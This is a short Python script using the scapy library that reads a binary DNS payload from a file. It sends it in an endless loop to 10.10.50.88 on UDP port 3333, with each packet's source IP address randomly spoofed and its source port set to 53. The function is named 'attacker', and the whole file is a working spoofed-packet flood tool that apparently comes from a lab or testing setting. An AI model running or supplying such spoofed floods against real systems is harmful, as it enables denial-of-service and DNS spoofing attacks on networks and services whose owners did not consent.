# from pwn import *
from scapy.all import *
import random

fd = open("./dns_recv.bin", "rb")
data = fd.read()
fd.close()
rangeport = [21,25,80,443,8000,123,53,169,69,111,118,135,139,464,992,123,23]

def random_str(randomlength=8):
    str = ''
    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
    length = len(chars) - 1
    for i in range(randomlength):
        str+=chars[random.randint(0, length)]
    return str

def attacker(host="127.0.0.1", port=9998):
    for i in range(random.randint(20,40)):
    	iprandom=random.randint(0,4000000000)
    	sip=socket.inet_ntoa(struct.pack('I',socket.htonl(iprandom)))

        pkt = IP(src=sip, dst=host)/UDP(dport=port, sport=53)/Raw(load=data)
        # pkt.show()
        send(pkt)
    return True

if __name__ == "__main__":
    while True:
        print attacker('10.10.50.88', 3333)
